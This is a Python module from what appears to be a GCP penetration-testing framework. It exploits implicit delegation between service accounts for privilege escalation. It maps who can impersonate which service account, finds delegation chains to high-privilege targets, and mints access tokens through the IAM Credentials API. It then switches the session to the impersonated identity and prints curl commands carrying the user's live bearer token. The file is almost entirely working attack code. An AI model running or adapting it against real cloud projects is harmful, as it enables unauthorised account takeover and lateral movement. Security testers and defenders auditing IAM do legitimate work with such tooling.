"""
GCP Implicit Delegation Exploitation Module.

Exploits the iam.serviceAccounts.implicitDelegation permission for lateral movement.

How Implicit Delegation works:
1. You have implicitDelegation on ServiceAccount A
2. ServiceAccount A can impersonate ServiceAccount B
3. You can use A as a delegate to get tokens for B (even without direct access to B)
4. Chain: You → SA_A → SA_B → SA_C → ...

This module:
- Maps which service accounts can impersonate others
- Finds delegation chains to reach high-privilege SAs
- Generates access tokens via delegation chains
- Stores impersonated credentials in session

References:
- https://cloud.google.com/iam/docs/service-account-impersonation
- https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
"""

import json
from typing import Dict, List, Any, Optional, Set, Tuple, TYPE_CHECKING

from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt
from rich.tree import Tree

if TYPE_CHECKING:
    from ...gcp_session import GCPSessionManager

console = Console()


# Permissions that allow impersonation
IMPERSONATION_PERMISSIONS = [
    "iam.serviceAccounts.getAccessToken",
    "iam.serviceAccounts.getOpenIdToken",
    "iam.serviceAccounts.signBlob",
    "iam.serviceAccounts.signJwt",
    "iam.serviceAccounts.implicitDelegation",
    "iam.serviceAccounts.actAs",
]

# Roles that commonly grant impersonation
IMPERSONATION_ROLES = [
    "roles/iam.serviceAccountTokenCreator",
    "roles/iam.serviceAccountUser",
    "roles/iam.workloadIdentityUser",
    "roles/owner",
    "roles/editor",
]


def _get_service_accounts(
    session_mgr: "GCPSessionManager",
    project_id: str,
) -> List[Dict[str, Any]]:
    """List all service accounts in a project."""
    from google.cloud import iam_admin_v1
    from google.api_core.exceptions import PermissionDenied, GoogleAPICallError

    credentials = session_mgr.get_credentials()
    if not credentials:
        return []

    try:
        client = iam_admin_v1.IAMClient(credentials=credentials)
        request = iam_admin_v1.ListServiceAccountsRequest(
            name=f"projects/{project_id}"
        )

        service_accounts = []
        for sa in client.list_service_accounts(request=request):
            service_accounts.append({
                "email": sa.email,
                "name": sa.name,
                "display_name": sa.display_name,
                "unique_id": sa.unique_id,
                "disabled": sa.disabled,
            })

        return service_accounts

    except PermissionDenied:
        console.print(f"[red]Permission denied listing service accounts in {project_id}[/red]")
        return []
    except GoogleAPICallError as e:
        console.print(f"[red]Error listing service accounts: {e}[/red]")
        return []


def _get_sa_iam_policy(
    session_mgr: "GCPSessionManager",
    service_account_email: str,
) -> Optional[Dict[str, Any]]:
    """Get IAM policy for a service account (who can impersonate it)."""
    from google.cloud import iam_admin_v1
    from google.api_core.exceptions import PermissionDenied, GoogleAPICallError
    from google.iam.v1 import iam_policy_pb2

    credentials = session_mgr.get_credentials()
    if not credentials:
        return None

    try:
        client = iam_admin_v1.IAMClient(credentials=credentials)

        # Build the resource name
        # Format: projects/{project}/serviceAccounts/{email}
        parts = service_account_email.split("@")
        if len(parts) != 2:
            return None

        project_id = parts[1].replace(".iam.gserviceaccount.com", "")
        resource = f"projects/{project_id}/serviceAccounts/{service_account_email}"

        request = iam_policy_pb2.GetIamPolicyRequest(resource=resource)
        policy = client.get_iam_policy(request=request)

        bindings = []
        for binding in policy.bindings:
            bindings.append({
                "role": binding.role,
                "members": list(binding.members),
            })

        return {
            "service_account": service_account_email,
            "bindings": bindings,
        }

    except PermissionDenied:
        return None
    except GoogleAPICallError:
        return None


def _can_impersonate(bindings: List[Dict], member: str) -> List[str]:
    """
    Check if a member can impersonate based on IAM bindings.

    Returns list of roles that grant impersonation.
    """
    impersonation_roles_found = []

    for binding in bindings:
        role = binding.get("role", "")
        members = binding.get("members", [])

        # Check if member is in this binding
        member_match = False
        for m in members:
            if m == member:
                member_match = True
                break
            # Check for allUsers/allAuthenticatedUsers
            if m in ["allUsers", "allAuthenticatedUsers"]:
                member_match = True
                break
            # Check for domain match
            if m.startswith("domain:") and member.endswith(m.split(":")[1]):
                member_match = True
                break

        if member_match:
            # Check if this role grants impersonation
            for imp_role in IMPERSONATION_ROLES:
                if role == imp_role or role.endswith(imp_role):
                    impersonation_roles_found.append(role)
                    break

    return impersonation_roles_found


def map_impersonation_graph(
    session_mgr: "GCPSessionManager",
    project_id: Optional[str] = None,
) -> Optional[Dict[str, Any]]:
    """
    Map the impersonation graph for all service accounts in a project.

    Shows which identities can impersonate which service accounts.

    Returns:
        Dictionary with the impersonation graph
    """
    # Get project
    if not project_id:
        project_id = session_mgr.default_project
        if not project_id:
            console.print("[bold yellow]🔍 Map Impersonation Graph[/bold yellow]")
            project_id = Prompt.ask("[cyan]Project ID[/cyan]", default="")
            if not project_id:
                console.print("[red]Project ID is required.[/red]")
                return None

    console.print(f"\n[bold blue]🕸️  Mapping Impersonation Graph[/bold blue]")
    console.print(f"[dim]Project: {project_id}[/dim]\n")

    # Get all service accounts
    console.print("[cyan]Fetching service accounts...[/cyan]")
    service_accounts = _get_service_accounts(session_mgr, project_id)

    if not service_accounts:
        console.print("[yellow]No service accounts found or no permission to list them.[/yellow]")
        return None

    console.print(f"[dim]Found {len(service_accounts)} service accounts[/dim]")

    # Build impersonation graph
    graph: Dict[str, Dict[str, Any]] = {}  # SA email -> who can impersonate

    console.print("[cyan]Analyzing IAM policies on each service account...[/cyan]")

    for i, sa in enumerate(service_accounts):
        email = sa["email"]
        console.print(f"[dim]  [{i+1}/{len(service_accounts)}] Checking {email}...[/dim]", end="")

        policy = _get_sa_iam_policy(session_mgr, email)

        if policy:
            impersonators = []
            for binding in policy.get("bindings", []):
                role = binding.get("role", "")
                # Check if this role grants impersonation
                if any(r in role for r in ["TokenCreator", "serviceAccountUser", "owner", "editor"]):
                    for member in binding.get("members", []):
                        impersonators.append({
                            "member": member,
                            "role": role,
                        })

            graph[email] = {
                "display_name": sa.get("display_name", ""),
                "disabled": sa.get("disabled", False),
                "impersonators": impersonators,
            }
            console.print(f" [green]{len(impersonators)} impersonator(s)[/green]")
        else:
            graph[email] = {
                "display_name": sa.get("display_name", ""),
                "disabled": sa.get("disabled", False),
                "impersonators": [],
                "error": "Could not fetch IAM policy",
            }
            console.print(f" [yellow]no access to policy[/yellow]")

    # Save to session
    session_mgr.save_enumeration_data("impersonation_graph", {
        "project_id": project_id,
        "graph": graph,
    })

    # Display results
    console.print()

    table = Table(title=f"Impersonation Graph - {project_id}")
    table.add_column("Service Account", style="cyan")
    table.add_column("Can Be Impersonated By", style="white")
    table.add_column("Via Role", style="dim")

    for sa_email, data in graph.items():
        impersonators = data.get("impersonators", [])
        if impersonators:
            for imp in impersonators:
                # Highlight if impersonator is another SA (potential chain)
                member = imp["member"]
                if "serviceAccount:" in member:
                    member_display = f"[yellow]{member}[/yellow]"
                elif member in ["allUsers", "allAuthenticatedUsers"]:
                    member_display = f"[red]{member} (PUBLIC!)[/red]"
                else:
                    member_display = member

                table.add_row(sa_email, member_display, imp["role"])
                sa_email = ""  # Don't repeat SA email for multiple impersonators
        else:
            error = data.get("error", "")
            if error:
                table.add_row(sa_email, f"[dim]{error}[/dim]", "")
            else:
                table.add_row(sa_email, "[dim]No impersonators found[/dim]", "")

    console.print(table)

    # Find potential delegation chains (SA → SA)
    console.print("\n[bold yellow]🔗 Potential Delegation Chains (SA → SA):[/bold yellow]")
    chains_found = False
    for sa_email, data in graph.items():
        for imp in data.get("impersonators", []):
            member = imp["member"]
            if member.startswith("serviceAccount:"):
                chains_found = True
                source_sa = member.replace("serviceAccount:", "")
                console.print(f"  [yellow]{source_sa}[/yellow] → [cyan]{sa_email}[/cyan]")

    if not chains_found:
        console.print("  [dim]No SA-to-SA delegation found[/dim]")

    console.print("\n[green]Graph saved under key 'impersonation_graph' in session data.[/green]")

    return {"project_id": project_id, "graph": graph}


def find_delegation_chains(
    session_mgr: "GCPSessionManager",
    target_sa: Optional[str] = None,
) -> Optional[List[List[str]]]:
    """
    Find delegation chains from current identity to a target service account.

    Uses BFS to find all paths through the impersonation graph.
    """
    # Load impersonation graph
    graph_data = session_mgr.enumerated_data.get(
        session_mgr.current_session, {}
    ).get("impersonation_graph")

    if not graph_data:
        console.print("[yellow]No impersonation graph found. Run 'map_impersonation' first.[/yellow]")
        return None

    graph = graph_data.get("graph", {})

    if not graph:
        console.print("[red]Impersonation graph is empty.[/red]")
        return None

    # Get current identity
    current_identity = None
    data = session_mgr.current_session_data
    auth_method = data.get("auth_method")

    if auth_method == "service_account":
        current_identity = f"serviceAccount:{data.get('service_account_email')}"
    elif auth_method == "adc":
        sa_email = data.get("service_account_email")
        if sa_email:
            current_identity = f"serviceAccount:{sa_email}"

    if not current_identity:
        console.print("[bold yellow]🔗 Find Delegation Chains[/bold yellow]")
        console.print("[dim]Could not determine current identity automatically.[/dim]")
        current_identity = Prompt.ask(
            "[cyan]Your identity (e.g., serviceAccount:sa@project.iam.gserviceaccount.com)[/cyan]",
            default=""
        )
        if not current_identity:
            console.print("[red]Identity is required.[/red]")
            return None

    # Get target
    if not target_sa:
        console.print("\n[bold yellow]🎯 Available Target Service Accounts:[/bold yellow]")
        for i, sa_email in enumerate(sorted(graph.keys())[:20]):
            console.print(f"  [{i+1}] {sa_email}")
        if len(graph) > 20:
            console.print(f"  [dim]... and {len(graph) - 20} more[/dim]")

        target_sa = Prompt.ask(
            "\n[cyan]Target service account email[/cyan]",
            default=""
        )
        if not target_sa:
            console.print("[red]Target is required.[/red]")
            return None

    console.print(f"\n[bold blue]🔗 Finding Delegation Chains[/bold blue]")
    console.print(f"[dim]From: {current_identity}[/dim]")
    console.print(f"[dim]To: {target_sa}[/dim]\n")

    # Build reverse graph (who can I impersonate from here?)
    # Original graph: SA -> who can impersonate it
    # We need: identity -> who can I impersonate
    can_impersonate: Dict[str, Set[str]] = {}

    for sa_email, data in graph.items():
        for imp in data.get("impersonators", []):
            member = imp["member"]
            if member not in can_impersonate:
                can_impersonate[member] = set()
            can_impersonate[member].add(sa_email)

    # BFS to find all paths
    from collections import deque

    queue = deque([(current_identity, [current_identity])])
    visited = {current_identity}
    all_paths: List[List[str]] = []

    while queue:
        current, path = queue.popleft()

        # Check if we reached target
        if current == target_sa or current == f"serviceAccount:{target_sa}":
            all_paths.append(path)
            continue

        # Get SAs we can impersonate from current position
        reachable = can_impersonate.get(current, set())

        # Also check if current is a SA that can impersonate others
        if current.startswith("serviceAccount:"):
            sa_key = f"serviceAccount:{current.replace('serviceAccount:', '')}"
            reachable = reachable | can_impersonate.get(sa_key, set())

        for next_sa in reachable:
            sa_key = f"serviceAccount:{next_sa}"
            if sa_key not in visited and next_sa not in visited:
                visited.add(sa_key)
                visited.add(next_sa)
                queue.append((sa_key, path + [next_sa]))

    # Display results
    if all_paths:
        console.print(f"[bold green]✅ Found {len(all_paths)} delegation chain(s)![/bold green]\n")

        for i, path in enumerate(all_paths):
            console.print(f"[bold]Chain {i+1}:[/bold]")
            tree = Tree(f"[cyan]{path[0]}[/cyan] (you)")
            current_node = tree
            for j, step in enumerate(path[1:]):
                if step == target_sa:
                    current_node = current_node.add(f"[green]{step}[/green] (TARGET)")
                else:
                    current_node = current_node.add(f"[yellow]{step}[/yellow]")
            console.print(tree)
            console.print()

        console.print("[dim]Use 'impersonate <chain_number>' to exploit a chain.[/dim]")

        # Save chains to session
        session_mgr.save_enumeration_data("delegation_chains", {
            "source": current_identity,
            "target": target_sa,
            "chains": all_paths,
        })

        return all_paths
    else:
        console.print(f"[yellow]No delegation chains found from {current_identity} to {target_sa}[/yellow]")
        console.print("[dim]This doesn't mean it's impossible - you may need more enumeration.[/dim]")
        return None


def generate_access_token_direct_api(
    session_mgr: "GCPSessionManager",
    target_sa: str,
    delegates: Optional[List[str]] = None,
    lifetime: int = 3600,
    scopes: Optional[List[str]] = None,
) -> Optional[Dict[str, Any]]:
    """
    Generate an access token using the IAM Credentials API directly.

    This is the correct way to exploit implicit delegation chains.
    Uses: POST https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/{SA}:generateAccessToken

    Args:
        target_sa: Target service account email
        delegates: List of delegate service accounts (for implicit delegation chain)
        lifetime: Token lifetime in seconds (default 1 hour)
        scopes: OAuth scopes (default: cloud-platform)

    Returns:
        Dict with 'accessToken' and 'expireTime', or None on failure
    """
    import requests
    from google.auth.transport.requests import Request

    if scopes is None:
        scopes = ["https://www.googleapis.com/auth/cloud-platform"]

    credentials = session_mgr.get_credentials()
    if not credentials:
        console.print("[red]No credentials configured.[/red]")
        return None

    # Get access token from current credentials
    try:
        credentials.refresh(Request())
        current_token = credentials.token
    except Exception as e:
        console.print(f"[red]Failed to get current access token: {e}[/red]")
        return None

    if not current_token:
        console.print("[red]No access token available.[/red]")
        return None

    # Build the API URL
    # Format: https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/{SA}:generateAccessToken
    api_url = f"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/{target_sa}:generateAccessToken"

    # Build request body
    body: Dict[str, Any] = {
        "scope": scopes,
        "lifetime": f"{lifetime}s",
    }

    # Add delegates if provided (for implicit delegation)
    # Format: projects/-/serviceAccounts/{ACCOUNT_EMAIL}
    if delegates:
        body["delegates"] = [
            f"projects/-/serviceAccounts/{sa}" for sa in delegates
        ]

    headers = {
        "Authorization": f"Bearer {current_token}",
        "Content-Type": "application/json",
    }

    console.print(f"[dim]API: POST {api_url}[/dim]")
    if delegates:
        console.print(f"[dim]Delegates: {delegates}[/dim]")

    try:
        response = requests.post(api_url, json=body, headers=headers)

        if response.status_code == 200:
            result = response.json()
            return result
        else:
            error_msg = response.text
            try:
                error_json = response.json()
                error_msg = error_json.get("error", {}).get("message", response.text)
            except (ValueError, requests.exceptions.JSONDecodeError):
                # Response is not JSON, use text as-is
                pass
            console.print(f"[red]API Error ({response.status_code}): {error_msg}[/red]")
            return None

    except requests.exceptions.RequestException as e:
        # Catch only requests-related exceptions, not KeyboardInterrupt etc.
        console.print(f"[red]Request error: {e}[/red]")
        return None


def generate_access_token(
    session_mgr: "GCPSessionManager",
    target_sa: str,
    delegates: Optional[List[str]] = None,
    lifetime: int = 3600,
    use_direct_api: bool = True,
) -> Optional[str]:
    """
    Generate an access token for a target service account, optionally via delegation.

    Args:
        target_sa: Target service account email
        delegates: List of intermediate service accounts for delegation chain
        lifetime: Token lifetime in seconds (default 1 hour, max 12 hours)
        use_direct_api: If True, use direct IAM Credentials API (recommended for implicit delegation)

    Returns:
        Access token string or None on failure
    """
    # For implicit delegation, ALWAYS use direct API
    if delegates and use_direct_api:
        console.print("[cyan]Using direct IAM Credentials API (implicit delegation)...[/cyan]")
        result = generate_access_token_direct_api(
            session_mgr,
            target_sa,
            delegates=delegates,
            lifetime=lifetime,
        )
        if result and "accessToken" in result:
            console.print(f"[green]Token expires: {result.get('expireTime', 'unknown')}[/green]")
            return result["accessToken"]
        return None

    # Fallback to google-auth library for direct impersonation (no delegates)
    from google.auth import impersonated_credentials
    from google.auth.transport.requests import Request

    credentials = session_mgr.get_credentials()
    if not credentials:
        console.print("[red]No credentials configured.[/red]")
        return None

    try:
        console.print("[cyan]Using google-auth library (direct impersonation)...[/cyan]")

        target_creds = impersonated_credentials.Credentials(
            source_credentials=credentials,
            target_principal=target_sa,
            target_scopes=["https://www.googleapis.com/auth/cloud-platform"],
            lifetime=lifetime,
        )

        # Refresh to get the token
        target_creds.refresh(Request())

        if target_creds.token:
            return target_creds.token
        else:
            console.print("[red]Failed to obtain token.[/red]")
            return None

    except Exception as e:
        console.print(f"[red]Error generating token: {e}[/red]")

        # Try direct API as fallback
        if not use_direct_api:
            console.print("[yellow]Trying direct API as fallback...[/yellow]")
            result = generate_access_token_direct_api(
                session_mgr,
                target_sa,
                delegates=None,
                lifetime=lifetime,
            )
            if result and "accessToken" in result:
                return result["accessToken"]

        return None


def generate_token_curl_command(
    target_sa: str,
    delegates: Optional[List[str]] = None,
    access_token_placeholder: str = "<YOUR_ACCESS_TOKEN>",
) -> str:
    """
    Generate the curl command for manual execution.

    Useful for testing or when the API call fails.
    """
    api_url = f"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/{target_sa}:generateAccessToken"

    body: Dict[str, Any] = {
        "scope": ["https://www.googleapis.com/auth/cloud-platform"],
    }

    if delegates:
        body["delegates"] = [f"projects/-/serviceAccounts/{sa}" for sa in delegates]

    import json
    body_json = json.dumps(body, indent=2)

    curl_cmd = f'''curl -X POST \\
  "{api_url}" \\
  -H "Authorization: Bearer {access_token_placeholder}" \\
  -H "Content-Type: application/json" \\
  --data '{body_json}' '''

    return curl_cmd


def _get_current_bearer_token(session_mgr: "GCPSessionManager") -> Optional[str]:
    """Get the current bearer token from session credentials."""
    from google.auth.transport.requests import Request

    credentials = session_mgr.get_credentials()
    if not credentials:
        return None

    try:
        # Refresh to ensure we have a valid token
        credentials.refresh(Request())
        return credentials.token
    except Exception:
        return None


def impersonate_service_account(
    session_mgr: "GCPSessionManager",
    target_sa: Optional[str] = None,
    chain_index: Optional[int] = None,
    show_curl: bool = True,
) -> bool:
    """
    Impersonate a service account and store the token in session.

    Can use a delegation chain if one was found previously.

    Args:
        target_sa: Target service account email
        chain_index: Index of saved delegation chain to use
        show_curl: Whether to show the curl command (default True)
    """
    console.print("\n[bold blue]🎭 Service Account Impersonation[/bold blue]\n")

    # Check for saved delegation chains
    chains_data = session_mgr.enumerated_data.get(
        session_mgr.current_session, {}
    ).get("delegation_chains")

    delegates = None

    if chains_data and chain_index is not None:
        chains = chains_data.get("chains", [])
        if 0 < chain_index <= len(chains):
            chain = chains[chain_index - 1]
            target_sa = chain[-1]  # Last element is the target
            delegates = chain[1:-1] if len(chain) > 2 else None  # Middle elements are delegates
            console.print(f"[dim]Using saved chain {chain_index}[/dim]")
        else:
            console.print(f"[yellow]Invalid chain index. Available: 1-{len(chains)}[/yellow]")
            return False

    # Get target if not from chain
    if not target_sa:
        target_sa = Prompt.ask(
            "[cyan]Target service account email[/cyan]",
            default=""
        )
        if not target_sa:
            console.print("[red]Target service account is required.[/red]")
            return False

    # Ask for delegates if not from chain
    if not delegates and not chain_index:
        delegates_input = Prompt.ask(
            "[cyan]Delegates (comma-separated, empty for direct impersonation)[/cyan]",
            default=""
        )
        if delegates_input.strip():
            delegates = [d.strip() for d in delegates_input.split(",") if d.strip()]

    console.print(f"[dim]Target: {target_sa}[/dim]")
    if delegates:
        console.print(f"[dim]Delegates: {' → '.join(delegates)}[/dim]")

    # Show the attack details
    if delegates:
        console.print("\n[bold yellow]📋 Implicit Delegation Attack Details:[/bold yellow]")
        console.print(f"[dim]Chain: YOU → {' → '.join(delegates)} → {target_sa}[/dim]")
        console.print(f"[dim]Required permissions:[/dim]")
        console.print(f"[dim]  - You need implicitDelegation on {delegates[0]}[/dim]")
        if len(delegates) > 1:
            for i in range(len(delegates) - 1):
                console.print(f"[dim]  - {delegates[i]} needs implicitDelegation on {delegates[i+1]}[/dim]")
        console.print(f"[dim]  - {delegates[-1]} needs getAccessToken on {target_sa}[/dim]")

    # Generate token
    console.print("\n[cyan]Generating access token...[/cyan]")

    token = generate_access_token(
        session_mgr,
        target_sa,
        delegates=delegates,
        lifetime=3600,
        use_direct_api=True,  # Use direct API for implicit delegation
    )

    if not token:
        console.print("[red]Failed to generate token via API.[/red]")

        # Show curl command for manual debugging with actual token if available
        console.print("\n[yellow]📋 Manual curl command for debugging:[/yellow]")
        current_token = _get_current_bearer_token(session_mgr)
        if current_token:
            curl_cmd = generate_token_curl_command(target_sa, delegates, access_token_placeholder=current_token)
            console.print(f"[dim]{curl_cmd}[/dim]")
            console.print("\n[dim]This command uses your current access token.[/dim]")
        else:
            curl_cmd = generate_token_curl_command(target_sa, delegates)
            console.print(f"[dim]{curl_cmd}[/dim]")
            console.print("\n[dim]Replace <YOUR_ACCESS_TOKEN> with your current access token.[/dim]")
            console.print("[dim]Get your token with: gcloud auth print-access-token[/dim]")

        return False

    console.print(f"[green]✅ Token generated successfully![/green]")

    # Show the curl command if requested (with actual token)
    # For implicit delegation (with delegates), always show when show_curl is True
    # For direct impersonation, ask the user
    should_show_curl = False
    if show_curl:
        if delegates:
            should_show_curl = True  # Always show for implicit delegation
        else:
            should_show_curl = Prompt.ask("[cyan]Show curl command?[/cyan]", choices=["y", "n"], default="n") == "y"

    if should_show_curl:
        console.print("\n[yellow]📋 Curl command used (for reference):[/yellow]")
        current_token = _get_current_bearer_token(session_mgr)
        if current_token:
            curl_cmd = generate_token_curl_command(target_sa, delegates, access_token_placeholder=current_token)
        else:
            curl_cmd = generate_token_curl_command(target_sa, delegates)
        console.print(f"[dim]{curl_cmd}[/dim]")
    console.print(f"[dim]Token length: {len(token)} chars[/dim]")

    # Ask if user wants to switch to this identity
    switch = Prompt.ask(
        "\n[cyan]Switch to this identity? (creates new session)[/cyan]",
        choices=["y", "n"],
        default="y"
    )

    original_session = session_mgr.current_session

    if switch.lower() == "y":
        # Create new session with impersonated credentials
        new_session_name = f"impersonated-{target_sa.split('@')[0][:20]}"
        session_mgr.create_or_load_session(new_session_name)

        # Extract project from SA email
        project_id = target_sa.split("@")[1].replace(".iam.gserviceaccount.com", "")

        # Skip tokeninfo since we already know the identity
        session_mgr.set_access_token(token, project_id, skip_tokeninfo=True)
        session_mgr.current_session_data["impersonated_from"] = original_session
        session_mgr.current_session_data["impersonated_sa"] = target_sa
        session_mgr.current_session_data["service_account_email"] = target_sa
        if delegates:
            session_mgr.current_session_data["delegation_chain"] = delegates
        session_mgr.save_current_session()

        console.print(f"\n[green]Switched to new session: {new_session_name}[/green]")
        console.print(f"[dim]Identity: {target_sa}[/dim]")
        console.print(f"[dim]Project: {project_id}[/dim]")
        if delegates:
            console.print(f"[dim]Via delegation: {' → '.join(delegates)}[/dim]")
        console.print("\n[yellow]Note: Token expires in ~1 hour. Run 'whoami' to verify.[/yellow]")
    else:
        # Just display the tokens
        console.print("\n[bold]Obtained Access Token (impersonated):[/bold]")
        console.print(f"[dim]{token[:50]}...{token[-20:]}[/dim]")

        # Also show current bearer token for reference
        current_token = _get_current_bearer_token(session_mgr)
        if current_token:
            console.print("\n[bold]Your Current Bearer Token:[/bold]")
            console.print(f"[dim]{current_token[:50]}...{current_token[-20:]}[/dim]")

        console.print("\n[dim]Use 'set_token' to manually set the impersonated token in a session.[/dim]")

        # Also show curl command to use the token
        console.print("\n[yellow]📋 Example curl to test the impersonated token:[/yellow]")
        console.print(f"[dim]curl -H \"Authorization: Bearer {token[:20]}...\" \\[/dim]")
        console.print(f"[dim]  https://cloudresourcemanager.googleapis.com/v1/projects[/dim]")

    return True
